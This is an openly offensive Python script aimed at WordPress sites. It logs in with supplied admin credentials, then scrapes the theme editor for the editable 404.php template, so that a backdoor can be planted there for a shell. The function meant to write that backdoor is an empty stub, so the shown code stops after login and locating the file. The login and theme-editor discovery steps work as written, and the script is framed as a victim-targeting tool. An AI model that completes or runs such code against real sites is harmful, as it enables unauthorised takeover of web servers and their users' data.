from sys import argv, exit
from os import system
from pwn import log
import requests
import re

SESSION = requests.Session()

def parse_args() -> tuple:
    if(len(argv) <= 2 or argv[1] == "-h"):
        log.info(f"Usage: {argv[0]} <VICTIM> <WP_USERNAME> <WP_PASSWORD>")
        print("\t<VICTIM>: the website running on wordpress")
        print("\t<WP_USERNAME>: the username of the wordpress admin")
        print("\t<WP_PASSWORD>: the password of the wordpress admin")
        exit()

    if(not argv[1].startswith("http")):
        log.error("Missing schema (http:// | https://)")
        log.info("Adding http:// ...")
        argv[1] = "http://" + argv[1]

    if(not argv[1].endswith("/")):
        argv[1] += "/"

    return argv[1], argv[2], argv[3]

def do_login(rhost :str, wp_user: str, wp_pass: str) -> bool:
    SESSION.post(f"{rhost}wp-login.php", data = {
        "log": wp_user,
        "pwd": wp_pass,
        "wp-submit": "true"
    })

    if(len(SESSION.cookies) <= 1):
        return False
    
    return True

def get_404_page(rhost) -> str:
    pages_url = SESSION.get(f"{rhost}wp-admin/theme-editor.php").text
    try:
        unparsed_url = re.findall(".*404.php.*", pages_url)[0]
    except IndexError:
        return ""
    
    return unparsed_url.split('"')[1]

def do_backdoor(rhost: str, link: str):
    return 

def main(rhost: str, wp_user: str, wp_pass: str) -> bool:
    log.info(f"Targeting {rhost} with {wp_user}:{wp_pass} ...")
    log.info("Initializing session ... ")
    log.info("Trying to authenticate ...")
    
    if(not do_login(rhost, wp_user, wp_pass)):
        log.critical("Failed to authenticate")
        return False
    log.success(f"Authentication succeeded, got {len(SESSION.cookies)} new cookies")
    
    log.info("Attempting to find the 404.php edition page")
    editable_404 = get_404_page(rhost)
    
    if(editable_404 == ""):
        log.critical("404.php page not found, cannot get a shell")
        return False

    do_backdoor(rhost, editable_404)

if __name__ == "__main__":
    rhost, wp_user, wp_pass = parse_args()
    main(rhost, wp_user, wp_pass)